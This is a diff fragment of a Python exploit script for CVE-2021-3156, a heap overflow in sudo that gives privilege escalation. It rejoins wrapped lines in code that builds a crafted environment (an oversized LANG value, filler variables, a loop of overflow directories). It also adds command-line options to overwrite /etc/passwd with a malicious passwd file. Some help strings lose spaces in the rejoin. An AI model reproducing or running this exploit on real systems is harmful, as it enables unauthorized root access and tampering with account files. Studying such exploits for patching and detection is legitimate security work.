@@ -47,16 +47,12 @@ class Exploit(object):
         environ = {
             '\n\n\n\n\n': '\n' + self.data,
             'SUDO_ASKPASS': '/bin/false',
-            'LANG':
-'C.UTF-8@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
+            'LANG':'C.UTF-8@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
             'A': 'A' * 0xffff
         }
         for i in range(5000):
-            directory =
-'AAAAAAAAAAAAAAAAAAAAAAAAAAAA00000000000000000000000000%08d' % i
-            overflow =
-'11111111111111111111111111111111111111111111111111111111%s' %
-directory
+            directory ='AAAAAAAAAAAAAAAAAAAAAAAAAAAA00000000000000000000000000%08d' % i
+            overflow ='11111111111111111111111111111111111111111111111111111111%s' %directory
 
             if os.path.exists(directory):
                 sys.stdout.write('file exists %s\n' % directory)
@@ -112,16 +108,12 @@ increased.
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(
         add_help=True,
-        description='* Sudo Privilege Escalation / Heap Overflow -
-CVE-2021-3156 *'
+        description='* Sudo Privilege Escalation / Heap Overflow -CVE-2021-3156 *'
     )
     try:
-        parser.add_argument('-source', action='store', help='Path to
-malicious "passwd" file to overwrite the target')
-        parser.add_argument('-target', action='store', help='Target
-file path to be overwritten (default: /etc/passwd)')
-        parser.add_argument('-sleep', action='store', help='Sleep
-setting for forked processes (default: 0.01 seconds')
+        parser.add_argument('-source', action='store', help='Path tomalicious "passwd" file to overwrite the target')
+        parser.add_argument('-target', action='store', help='Targetfile path to be overwritten (default: /etc/passwd)')
+        parser.add_argument('-sleep', action='store', help='Sleepsetting for forked processes (default: 0.01 seconds')
         parser.set_defaults(target='/etc/passwd', sleep='0.01')
 
         options = parser.parse_args()
